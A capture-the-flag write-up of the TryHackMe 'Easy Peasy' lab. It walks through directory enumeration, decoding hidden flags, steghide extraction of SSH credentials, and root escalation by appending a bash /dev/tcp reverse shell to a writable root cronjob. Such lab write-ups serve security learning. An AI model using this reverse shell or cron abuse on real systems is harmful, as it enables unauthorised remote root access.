---
title: Easy Peasy
description: 'Finding hidden directories, using steghide and abusing a cronjob to escalate to root'
pubDate: 2024-08-23
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/c376e08c928f806745c90c93b051127a.png'
---

Running a feroxbuster on the target reveals some interesting dirs.

```bash
feroxbuster -u http://10.10.173.229
...[snip]...
[####################] - 66s    30000/30000   452/s   http://10.10.173.229/hidden/
[####################] - 65s    30000/30000   460/s   http://10.10.173.229/hidden/whatever/
```

On the page `/hidden/whatever/` we find a hidden string in the source.
The string `ZmxhZ3tmMXJzN19mbDRnfQ==` looks like base 64.
```bash
echo ZmxhZ3tmMXJzN19mbDRnfQ== | base64 -d
flag{f1rs7_fl4g}
```

On the high port (`65524`) we find the next flag "hidden" in the text.

```
flag{9fdafbd64c47471a8f54cd3fc64cd312}
```

If we check the `robots.txt` we get an other flag.
```
...[snip]...
User-Agent:a18672860d0510e5ab6699730763b250
...[snip]...
```

Looking up this hash online it shows the second flag (https://md5.gromweb.com/?md5=a18672860d0510e5ab6699730763b250): `flag{1m_s3c0nd_fl4g}`

And also a "hidden" flag in the source.

```html
<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

Trying a few base encodings on CyberChef (https://gchq.github.io/CyberChef/#recipe=From_Base62('0-9A-Za-z')&input=T2JzSm1QMTczTjJYNmRPckFnRUFMMFZ1) we find its base62.
`/n0th1ng3ls3m4tt3r`

This is the next step which seems like a dir on the target.
Again there is a "hidden" string in on the page: `940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`

This is possibly a hash. I tried cracking it with `rockyou.txt` but it didn't find anything.

```bash
hashcat -m 6900 '940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81' /usr/share/wordlists/rockyou.txt
```

Searching this string online will give us this:

```
Gost hash
calculated hash digest
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
Gost value
Reversed hash value
mypasswordforthatjob
```

When downloading the image from that page and using the password we just found with steghide we see an interesting file.

```bash
steghide info binarycodepixabay.jpg -p mypasswordforthatjob
"binarycodepixabay.jpg":
  format: jpeg
  capacity: 4.6 KB
  embedded file "secrettext.txt":
    size: 278.0 Byte
    encrypted: no
    compressed: no
```

Extracting the file:

```bash
steghide extract -sf binarycodepixabay.jpg -xf secrettext.txt -p mypasswordforthatjob
```
In the file there is a username and a password in binary format, converting it gives the plain text password

`boring:iconvertedmypasswordtobinary`


## USER

When we cat the user flag it looks like its encoded.

```
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

This looks like a simple ROT13 cipher (https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=c3ludHthMGp2Z2YzM3pmYTBlejR5fQ): `flag{n0wits33msn0rm4l}`


## ROOT

When we login on SSH we see a message:

```
You Have 1 Minute Before AC-130 Starts Firing
```

So it seems that something is running every minute, lets check the crontab:

```bash
cat /etc/crontab
...[snip]...
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

We have write access to this file so we can add a reverse shell to it:

```bash
nano /var/www/.mysecretcronjob.sh
#!/bin/bash
# i will run as root
bash -i >& /dev/tcp/10.8.119.137/4444 0>&1
```
After a minute we get a root shell on our listener.
